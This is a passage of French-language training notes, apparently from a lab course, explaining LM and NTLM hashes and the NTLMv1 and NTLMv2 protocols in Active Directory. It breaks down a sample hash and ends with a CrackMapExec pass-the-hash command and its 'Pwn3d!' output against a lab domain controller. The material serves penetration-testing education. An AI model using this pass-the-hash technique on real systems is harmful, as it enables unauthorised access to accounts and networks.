## NTLM Authentication
Outre Kerberos et LDAP, Active Directory utilise plusieurs autres méthodes d'authentification qui peuvent être utilisées (et détournées) par les applications et les services dans AD. Il s'agit de LM, NTLM, NTLMv1 et NTLMv2. LM et NTLM sont des noms de hachage, et NTLMv1 et NTLMv2 sont des protocoles d'authentification qui utilisent le hachage LM ou NT. Voici une comparaison rapide entre ces hachages et ces protocoles, qui nous montre que, bien qu'il ne soit pas parfait, Kerberos est souvent le protocole d'authentification de choix dans la mesure du possible. Il est essentiel de comprendre la différence entre les types de hachage et les protocoles qui les utilisent.

**An NTLM hash looks like this:**
`Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::`
En examinant le hachage ci-dessus, nous pouvons décomposer le hachage NTLM en ses différentes parties :

- `Rachel` est le nom d'utilisateur
- `500` est l'identifiant relatif (RID). 500 est le RID connu pour le compte administrateur
- `aad3c435b514a4eeaad3b935b51304fe` est le hachage LM et, si les hachages LM sont désactivés sur le système, il ne peut être utilisé pour rien.
- `e46b9e548fa0d122de7f59fb6d48eaa2` est le hachage NT. Ce hachage peut être craqué hors ligne pour révéler la valeur en clair (en fonction de la longueur/de la force du mot de passe) ou utilisé pour une attaque de type "pass-the-hash". Vous trouverez ci-dessous un exemple d'attaque "pass-the-hash" réussie à l'aide de l'outil CrackMapExec :
```
0xz0r0@htb[/htb]$ crackmapexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2

SMB         10.129.43.9     445    DC01      [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    DC01      [+] INLANEFREIGHT.LOCAL\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!)

```